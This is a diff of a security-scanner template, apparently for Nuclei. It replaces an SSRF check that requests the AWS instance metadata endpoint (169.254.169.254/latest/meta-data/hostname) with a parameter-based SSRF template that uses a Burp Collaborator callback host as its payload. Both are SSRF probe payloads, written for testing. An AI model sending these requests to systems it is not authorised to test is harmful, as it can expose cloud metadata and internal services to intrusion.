@@ -1,18 +1,16 @@
-id: SSRF
+template:
+   name: param-ssrf
+   severity: info
+   author: zoidsec
+   description: Server-Side Request Forgery Parameter Based
 
-info:
-  name: SSRF-AWS
-  author: 25
-  severity: high
-  tags: SSRF
+request:
+   payloads: 
+      - http://zsvsszmbku3xldyywzg1jc0nkeq6ev.burpcollaborator.net
 
-requests:
-  - method: GET
-    path:
-      - "{{BaseURL}}http://169.254.169.254/latest/meta-data/hostname"
+   paths: false
+response:
+   statusCode: 200
+   patterns: 
+      - lszm4qbbva85dqtcuv393czjkgz
 
-    matchers:
-       - type: word
-         part: body
-         words:
-           - "compute.internal"
